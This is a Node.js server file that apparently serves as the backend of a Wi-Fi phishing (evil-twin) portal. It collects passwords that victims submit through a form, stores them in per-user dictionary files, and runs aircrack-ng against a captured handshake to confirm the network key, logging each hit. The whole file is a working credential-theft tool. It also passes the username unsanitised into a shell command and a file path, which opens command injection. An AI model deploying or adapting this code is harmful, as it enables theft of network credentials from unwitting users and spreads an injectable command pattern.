require('dotenv').config()
const polka = require('polka')
const bodyParser = require('body-parser')
const cors = require('cors')
const Loggger = require('./logger')

const fs = require('fs');
const execSync = require('child_process').execSync;


const port =  process.env.PORT || 3000
const dictionary = 'dict'
const keyReg = /KEY FOUND! \[ *.+ ]/g
const log = Loggger()

polka()
    .use(bodyParser.json())
    .use(cors())
    .post('/', (req, res) => {
        // Capture values from form
        const {username, password} = req.body
        // Save info and create dictionary
        const curentDictionary = `${dictionary}/${username}.txt`
        fs.writeFileSync(
            curentDictionary,
            `${password}\n`,
            {
                flag: 'a+',
                encoding:'utf-8'
            }
        )
        // test password
        const output = execSync(`aircrack-ng ${process.env.CAPFILE} -w ${curentDictionary}`, { encoding: 'utf-8' });
        if(keyReg.test(output)) {
            const key = output.match(keyReg)[0]
            log.info(`Success: ${username} - ${key}`)
            const okRes = JSON.stringify({status: 'ok'})
            res.end(okRes)
        } else {
            log.error(`Try: ${username} - ${password}`)
            res.end('')
        }
    })
    .listen(port, err => {
        if(err) throw err
        if(!fs.existsSync(dictionary)) {
            fs.mkdirSync(dictionary)
        }
        console.log(`Running in ${port}`)
    })